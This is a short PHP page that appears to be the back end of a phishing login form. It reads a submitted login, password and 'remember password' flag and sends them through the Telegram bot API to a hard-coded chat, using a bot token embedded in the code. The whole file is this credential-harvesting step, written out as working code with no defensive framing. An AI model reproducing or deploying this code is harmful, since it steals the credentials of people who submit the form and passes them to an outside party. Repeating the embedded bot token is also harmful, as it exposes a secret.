<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <?php
        try{
            $login = $_POST['login'];
            $password = $_POST['password'];
            $remember_password = $_POST['remember_password'];
            if($remember_password == 1){
                $remember_password = "yes";
            } else{
                $remember_password = "no";
            }

        } catch (\Throwable $th){
            $login ="ERROR IN MESSAGE";
            $password = "ERROR IN MESSAGE";
            $city = "ERROR IN MESSAGE";
        }

        $token = "7690560635:AAHXdf5hLhfVFcqblk_tIexU1-IXDIQSN7k"; //token from bot father
        $chat_id = 5502242989; // number of active chat from https://api.telegram.org/bot7690560635:AAHXdf5hLhfVFcqblk_tIexU1-IXDIQSN7k/getUpdates


        $login = urlencode("$login");
        $password = urlencode("$password");
        $remember_password = urlencode("$remember_password");

        $urlQuerly = "https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $chat_id ."&text=" . "login=  " . $login . "   password=  " . $password . "   remember_password=   " . $remember_password;
        $result = file_get_contents($urlQuerly);
        ?>
</body>
</html>